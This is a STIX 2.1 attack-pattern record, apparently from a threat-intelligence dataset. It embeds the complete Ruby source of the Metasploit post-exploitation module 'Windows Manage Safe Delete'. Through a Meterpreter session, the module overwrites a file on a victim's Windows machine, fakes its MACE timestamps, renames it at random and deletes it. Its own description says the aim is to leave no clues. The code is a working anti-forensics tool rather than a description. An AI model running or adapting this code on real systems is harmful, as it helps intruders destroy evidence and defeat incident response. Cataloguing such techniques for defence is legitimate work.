{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e77034b8-f2a2-4761-a7d4-31ae0d389414",
    "created": "2024-08-14T16:33:04.996498Z",
    "modified": "2024-08-14T16:33:04.996502Z",
    "name": "Windows Manage Safe Delete",
    "description": " The goal of the module is to hinder the recovery of deleted files by overwriting its contents.  This could be useful when you need to download some file on the victim machine and then delete it without leaving clues about its contents. Note that the script does not wipe the free disk space so temporary/sparse/encrypted/compressed files could not be overwritten. Note too that MTF entries are not overwritten so very small files could stay resident within the stream descriptor.  'License' => BSD_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/sdel.rb",
            "external_id": "sdel.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'\t=> 'Windows Manage Safe Delete',\n        'Description' => %q{\n          The goal of the module is to hinder the recovery of deleted files by overwriting\n          its contents.  This could be useful when you need to download some file on the victim\n          machine and then delete it without leaving clues about its contents. Note that the script\n          does not wipe the free disk space so temporary/sparse/encrypted/compressed files could\n          not be overwritten. Note too that MTF entries are not overwritten so very small files\n          could stay resident within the stream descriptor.\n        },\n        'License' => BSD_LICENSE,\n        'Author' => [ 'Borja Merino <bmerinofe[at]gmail.com>'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              priv_fs_set_file_mace\n              stdapi_fs_stat\n              stdapi_railgun_api\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptBool.new('ZERO', [ false, 'Zero overwrite. If set to false, random data will be used', false]),\n        OptInt.new('ITERATIONS', [false, 'The number of overwrite passes', 1 ]),\n        OptString.new('FILE', [true, 'File to be deleted', ''])\n      ]\n    )\n  end\n\n  def run\n    type = 1\n    n = datastore['ITERATIONS']\n    file = datastore['FILE']\n\n    if datastore['ZERO']\n      type = 0\n      print_status('The file will be overwritten with null bytes')\n    end\n\n    if !file_exist?(file)\n      print_error(\"File #{file} does not exist\")\n      return\n    elsif comp_encr(file)\n      print_status('File compress or encrypted. Content could not be overwritten!')\n    end\n    file_overwrite(file, type, n)\n  end\n\n  # Function to calculate the size of the cluster\n  def size_cluster\n    drive = session.sys.config.getenv('SystemDrive')\n    r = session.railgun.kernel32.GetDiskFreeSpaceA(drive, 4, 4, 4, 4)\n    cluster = r['lpBytesPerSector'] * r['lpSectorsPerCluster']\n    print_status(\"Cluster Size: #{cluster}\")\n\n    return cluster\n  end\n\n  # Function to calculate the real file size on disk (file size + slack space)\n  def size_on_disk(file)\n    size_file = session.fs.file.stat(file).size\n    print_status(\"Size of the file: #{size_file}\")\n\n    if (size_file < 800)\n      print_status(\"The file is too small. If it's store in the MTF (NTFS) sdel will not overwrite it!\")\n    end\n\n    sizeC = size_cluster\n    size_ = size_file.divmod(sizeC)\n\n    if size_.last != 0\n      real_size = (size_.first * sizeC) + sizeC\n    else\n      real_size = size_.first * sizeC\n    end\n\n    print_status(\"Size on disk: #{real_size}\")\n    return real_size\n  end\n\n  # Change MACE attributes. Get a fake date by subtracting N days from the current date\n  def change_mace(file)\n    rsec = Rex::Text.rand_text_numeric(7, bad = '012')\n    date = Time.now - rsec.to_i\n    print_status('Changing MACE attributes')\n    session.priv.fs.set_file_mace(file, date, date, date, date)\n  end\n\n  # Function to overwrite the file\n  def file_overwrite(file, type, n)\n    # FILE_FLAG_WRITE_THROUGH: Write operations will go directly to disk\n    r = session.railgun.kernel32.CreateFileA(file, 'GENERIC_WRITE', 'FILE_SHARE_READ|FILE_SHARE_WRITE', nil, 'OPEN_EXISTING', 'FILE_FLAG_WRITE_THROUGH', 0)\n    handle = r['return']\n    real_size = size_on_disk(file)\n\n    if type == 0\n      random = \"\\0\" * real_size\n    end\n\n    i = 0\n    n.times do\n      i += 1\n      print_status(\"Iteration #{i}/#{n}:\")\n\n      if type == 1\n        random = Rex::Text.rand_text(real_size, nil)\n      end\n\n      # http://msdn.microsoft.com/en-us/library/windows/desktop/aa365541(v=vs.85).aspx\n      session.railgun.kernel32.SetFilePointer(handle, 0, nil, 'FILE_BEGIN')\n\n      # http://msdn.microsoft.com/en-us/library/windows/desktop/aa365747(v=vs.85).aspx\n      w = session.railgun.kernel32.WriteFile(handle, random, real_size, 4, nil)\n\n      if w['return'] == false\n        print_error('The was an error writing to disk, check permissions')\n        return\n      end\n\n      print_status(\"#{w['lpNumberOfBytesWritten']} bytes overwritten\")\n    end\n\n    session.railgun.kernel32.CloseHandle(handle)\n    change_mace(file)\n\n    # Generate a long random file name before delete it\n    newname = Rex::Text.rand_text_alpha(200, nil)\n    print_status('Changing file name')\n\n    # http://msdn.microsoft.com/en-us/library/windows/desktop/aa365239(v=vs.85).aspx\n    session.railgun.kernel32.MoveFileA(file, newname)\n\n    file_rm(newname)\n    print_good('File erased!')\n  end\n\n  # Check if the file is encrypted or compressed\n  def comp_encr(file)\n    # http://msdn.microsoft.com/en-us/library/windows/desktop/aa364944(v=vs.85).aspx\n    handle = session.railgun.kernel32.GetFileAttributesA(file)\n    type = handle['return']\n\n    # FILE_ATTRIBUTE_COMPRESSED=0x800\n    # FILE_ATTRIBUTE_ENCRYPTED=0x4000\n    if (type & (0x4800)).nonzero?\n      return true\n    end\n\n    return false\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}